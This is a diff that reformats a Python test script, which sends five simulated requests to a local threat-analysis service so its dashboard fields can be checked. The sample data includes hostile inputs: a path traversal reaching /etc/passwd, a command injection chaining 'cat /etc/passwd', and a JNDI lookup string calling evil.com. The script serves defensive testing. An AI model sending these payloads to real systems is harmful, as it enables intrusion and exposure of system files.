@@ -3,18 +3,20 @@
 Final dashboard test - simulate attacks and verify all fields display correctly
 """
 import asyncio
-import httpx
 import time
+
+import httpx
+
 
 async def final_dashboard_test():
     """Run final comprehensive test of dashboard functionality"""
-    
+
     print("🎯 Final Dashboard Functionality Test")
     print("=" * 40)
     print("This will send 5 different attacks to test all dashboard fields")
     print("Watch the dashboard at: http://localhost:8080/simple-ai-dashboard.html")
     print("=" * 40)
-    
+
     attacks = [
         {
             "name": "Path Traversal Attack",
@@ -29,9 +31,9 @@ async def final_dashboard_test():
                 "header_count": 4,
                 "hour_of_day": 16,
                 "query": "file=../../../etc/passwd",
-                "body": ""
+                "body": "",
             },
-            "context": {"previous_requests": 3, "failed_attempts": 2, "anomaly_score": 0.7}
+            "context": {"previous_requests": 3, "failed_attempts": 2, "anomaly_score": 0.7},
         },
         {
             "name": "Command Injection",
@@ -46,9 +48,9 @@ async def final_dashboard_test():
                 "header_count": 6,
                 "hour_of_day": 16,
                 "query": "",
-                "body": "{\"cmd\": \"ls -la; cat /etc/passwd\"}"
+                "body": '{"cmd": "ls -la; cat /etc/passwd"}',
             },
-            "context": {"previous_requests": 12, "failed_attempts": 5, "anomaly_score": 0.85}
+            "context": {"previous_requests": 12, "failed_attempts": 5, "anomaly_score": 0.85},
         },
         {
             "name": "API Rate Limit Test",
@@ -63,9 +65,9 @@ async def final_dashboard_test():
                 "header_count": 8,
                 "hour_of_day": 16,
                 "query": "limit=1000&offset=0",
-                "body": ""
+                "body": "",
             },
-            "context": {"previous_requests": 150, "failed_attempts": 0, "anomaly_score": 0.4}
+            "context": {"previous_requests": 150, "failed_attempts": 0, "anomaly_score": 0.4},
         },
         {
             "name": "Legitimate User Request",
@@ -80,9 +82,9 @@ async def final_dashboard_test():
                 "header_count": 18,
                 "hour_of_day": 16,
                 "query": "",
-                "body": "{\"product_id\": 12345, \"quantity\": 2, \"user_id\": \"user_abc123\"}"
+                "body": '{"product_id": 12345, "quantity": 2, "user_id": "user_abc123"}',
             },
-            "context": {"previous_requests": 45, "failed_attempts": 0, "anomaly_score": 0.05}
+            "context": {"previous_requests": 45, "failed_attempts": 0, "anomaly_score": 0.05},
         },
         {
             "name": "Zero-Day Pattern",
@@ -97,37 +99,35 @@ async def final_dashboard_test():
                 "header_count": 5,
                 "hour_of_day": 16,
                 "query": "",
-                "body": "{\"message\": \"${jndi:ldap://evil.com/exploit}\"}"
+                "body": '{"message": "${jndi:ldap://evil.com/exploit}"}',
             },
-            "context": {"previous_requests": 8, "failed_attempts": 3, "anomaly_score": 0.95}
-        }
+            "context": {"previous_requests": 8, "failed_attempts": 3, "anomaly_score": 0.95},
+        },
     ]
-    
+
     async with httpx.AsyncClient(timeout=30.0) as client:
         for i, attack in enumerate(attacks, 1):
             print(f"\n🚀 Sending Attack {i}/5: {attack['name']}")
-            
+
             start_time = time.time()
             response = await client.post(
-                "http://localhost:18002/analyze",
-                json={
-                    "features": attack["features"],
-                    "context": attack["context"]
-                }
+                "http://localhost:18002/analyze", json={"features": attack["features"], "context": attack["context"]}
             )
             processing_time = (time.time() - start_time) * 1000
-            
+
             if response.status_code == 200:
                 result = response.json()
-                print(f"   ✅ Threat: {result['threat_type']} | Score: {result['threat_score']:.2f} | Action: {result['recommended_action']}")
+                print(
+                    f"   ✅ Threat: {result['threat_type']} | Score: {result['threat_score']:.2f} | Action: {result['recommended_action']}"
+                )
                 print(f"   ⏱️  Processing: {processing_time:.0f}ms")
             else:
                 print(f"   ❌ Failed: {response.status_code}")
-            
+
             # Wait 3 seconds between attacks for visual effect
             print("   ⏳ Waiting 3 seconds...")
             await asyncio.sleep(3)
-    
+
     print("\n🎉 Test Complete!")
     print("\n📊 Dashboard Verification Checklist:")
     print("   ✓ Check that 'Avg Confidence' shows a percentage (not NaN%)")
@@ -135,6 +135,7 @@ async def final_dashboard_test():
     print("   ✓ Confirm 'Request Details' shows Method, Path, Client IP, Query")
     print("   ✓ Ensure 'Recent Analysis' history shows real attack data")
     print("   ✓ Validate that threat scores and types are displayed correctly")
+
 
 if __name__ == "__main__":
     asyncio.run(final_dashboard_test())
